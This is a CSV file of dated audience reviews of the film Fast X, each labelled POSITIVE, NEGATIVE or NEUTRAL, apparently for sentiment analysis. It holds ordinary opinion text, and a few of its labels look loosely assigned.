Date,Score,Reviews
"Dec 3, 2023",NEGATIVE,Bloodshot returns defying reality and saving family. This time he faces a Joker variant with God's Eye.
"Dec 2, 2023",POSITIVE,"Excellent movie, with excellent graphics! Jason Momoa plays the part of a bad guy in this movie, and he does it very well. I highly recommend seeing this film. It will keep you on the edge of your seat!"
"Dec 1, 2023",NEGATIVE,"Goes to show happens when you get it really wrong. It tried hard to be a comedy and falls flat on its face, it was too lazy to fall its arse. Relies on trying to rehash an old storyline, not sure if they ran out of money for scrip writers with any understanding of the franchise or any talent or both. Will not be rushing to see what else they can vomit out for Fast 11"
"Nov 26, 2023",NEGATIVE,I do not have seen this movie
"Nov 26, 2023",NEGATIVE,"i don't know if Ridiculous is the right word. 

Delusional perhaps fits it perfectly."
"Nov 25, 2023",NEGATIVE,"It's time for the Fast Franchise to end! It's been a long, wild, and whacky ride for the Fast and Furious Franchise but I think it has finally outstayed it's welcome. Where the first 3 or 4 Fast movies were a little grounded with realism, this latest entry is just completely off of the rails. Yes, I understand this is a film where you turn your mind off and just enjoy the action but c'mon! The plot in Fast X is so far fetched and the action set pieces just ignore all laws of gravity, that it's really hard to enjoy this film. Vin Diesel even seems to be phoning it in here. The only one who seems to understand the assignment is the newest Villian played by Jason Momoa who is absolutely ridiculous in a good way. Jason seemed to channel his Heath Ledger knock off impersenation here and for the most part it works. Also please be original and stop retconning events, it comes off being lazy. How this movie ends spells out that there will be another Fast film but why?! Hasn't 10 entries been enough already?! Fast X gets 2 low X's out of 5 from me."
"Nov 24, 2023",NEGATIVE,"How can any adult watch this movie and walk away thinking ""man, that was good!""?  I really think that this movie was written by AI because I'm pretty sure it used every action movie trope ever conceived by a Hollywood writer, even when it didn't make sense to use it.  As an example, there's a scene where Dom ""discovers"" the bad guy's lair.  *Cue melodramatic music* *Zoom in on Dom's face, twisted into a stupid look of intrigue* ""This is where I'll find my answers!"".  Nevermind that he knows who the bad guy is and why he's coming after him.  What exactly is the question here, Dom!?  

Every action movie cliche ever devised?  Done to death.
Every line of dialogue written?  Stupid.
Every line of dialogue delivered?  Wooden.
Every joke?  Groan worthy. 
Every scene with Jason Momoa in it?  Chewed.

Then there's the repetition...Jason Momoa somehow magically finds a lookout spot that can oversee the whole city from every angle (they try to explain this away by giving him a screen with a few cameras on it) and SHOCK!  He's magnetically attached an explosive to the bottom of a vehicle!  *Chaos ensues*

Just let this franchise die please.  As much as I love seeing Jason Statham continuing to find work, I just can't stomach another one of these truly god awful films."
"Nov 23, 2023",NEGATIVE,"Why do they still keep making these movies? Oh, because dumbasses like me keep watching them."
"Nov 21, 2023",POSITIVE,Wish I would of watched this in the movie theater definitely one of the best in the trilogy!
"Nov 15, 2023",POSITIVE,Fast X didn't have hope for this movie from the trailer but this movie as watching was amazing i didn't expect to like it this much as I have the shots are amazing the comedy is actually funny as a lot of emotions and the villain is so good i didn't think it would of have been that good bc it seemed random he is my favorite villain of this franchise so overall very surprising 93%
"Nov 10, 2023",NEUTRAL,"If you're watching the tenth (sort of 11th) film in this franchise, you should know what your in for. Yeah it's dumb, I think that's the point. These films are purposefully stupid, and this one might be the best in that regards. I laughed the whole time, and had a blast."
"Nov 5, 2023",NEGATIVE,"Revving, explosions, tumbling flaming vehicles, impossibly attractive humans being ridiculously tough and laughably cool. If you're into predictable, noisy, expensive stupidity, this one is for you!!"
"Nov 5, 2023",NEGATIVE,"Frenetic, but boring. Fast, but slow. ""Furious"", but silly."
"Nov 4, 2023",POSITIVE,Best Movie of 2023 NO CAP
"Nov 3, 2023",POSITIVE,It was okay. A popcorn delight of a spectacle and the action only gets pacier.
"Nov 1, 2023",NEUTRAL,The stunts are getting tired but Jason Momoa's portrayal of a crazy killer made it worth watching.
"Nov 1, 2023",NEGATIVE,"Special effects superior . Already established actors excellent scenery fantastic visiting all these countries nothing like it!! Jason Momoa well, his part needed further work and insight 
He came off more as the Joker in Batman and not at all as an original character   This was very disappointing as I feel his acting has improved a bit, his rhetoric was boring costume was great. I feel he should went in and out of his facade with a deep masculine dialect. He never came off as serious just a skipping stone across the waters of terrorism. This method of acting gave no pause or regard to the tragic sequences unfolding; one scene went into the other losing the intenseness it should have portrayed. Again it gave pause for a yawn. Too much in special effects without intense acting. Kept me wondering. Did this movie turn into a comedy when I blinked? As I am pondering this thought I lost control of the story line."
"Oct 31, 2023",NEGATIVE,"Unrealistic poppycock — I hope I live 144 minutes longer so I can make up for the time this mindless drivel stole from me.  Innie Dieselbreath suuuuucks at acting; Jason Mamoa's performance was surprisingly good. I recommend skipping all the scenes without him.  All the ""good"" criminals are bulletproof and indestructible while the armoured vehicles and soldiers were made of papermashe."
"Oct 30, 2023",NEUTRAL,"So disapointed! This just keep going the wrong way.. Where is the director, who sees everything from a neutral angel!
U just simply cant use video used to make the other movies?! Its not like there were a random person recording the train heist…"
"Oct 30, 2023",POSITIVE,"jason momoa es lo mejor de la película su actuación fue grandiosa la traición en el final  . lo malo Vin Diesel Ni siquiera una herida para darle drama  .
Jason Momoa is the best thing about the movie, his performance was great, the betrayal at the end. the bad Vin Diesel not even a wound to give him drama"
"Oct 29, 2023",POSITIVE,Better than the last one. I think they are on the right path to end this series.
"Oct 28, 2023",POSITIVE,"What a blast. This movie was so much better than F9, I can't put into words how much fun I had watching this. I laughed at this movie more than I have any other film in the franchise. How can you not like this? sometimes people need to throw logic out the window and just have a good time.
this movie was great and one of the best in the franchise. I can't wait for part two, FOR FAMILY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
